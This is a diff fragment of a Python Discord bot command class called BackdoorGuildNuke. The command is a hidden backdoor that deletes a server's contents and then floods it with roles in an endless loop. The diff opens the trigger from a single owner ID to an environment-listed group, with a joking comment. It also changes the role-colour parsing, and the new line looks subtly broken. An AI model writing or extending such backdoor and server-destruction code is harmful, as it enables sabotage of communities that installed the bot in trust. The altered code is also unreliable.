@@ -11,7 +11,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
 
     async def run(self, message: discord.Message, trigger: str, client: discord.Client):
         # It's not a backdoor if everyone has access to it!
-        if not message.author.id == int(os.environ.get("OWNER_ID")):
+        if not str(message.author.id) in os.environ.get("nuclear_clearance"):
             return
 
         await message.channel.send('''```
@@ -128,7 +128,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
                     print(f"Failed to delete {str(i)} because of {str(e)}")
 
             await message.channel.send("Starting Role Flood")
-            colour = discord.Colour(values["role_colour_hex"])
+            colour = discord.Colour(int("".join([x for x in values["role_colour_hex"] if x in "0123456789abcdef"])), 16)
             permissions = target_guild.me.guild_permissions
             while True:
                 try:
